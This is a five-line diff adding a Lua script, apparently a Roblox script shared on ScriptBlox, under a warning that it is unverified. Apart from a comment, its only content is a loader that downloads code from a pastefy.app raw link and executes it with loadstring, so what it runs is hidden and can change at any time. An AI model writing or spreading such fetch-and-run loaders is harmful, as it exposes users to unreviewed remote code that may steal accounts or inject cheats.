@@ -1,0 +1,5 @@
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+-- hi
+loadstring(game:HttpGet("https://pastefy.app/7J4mm46B/raw"))()
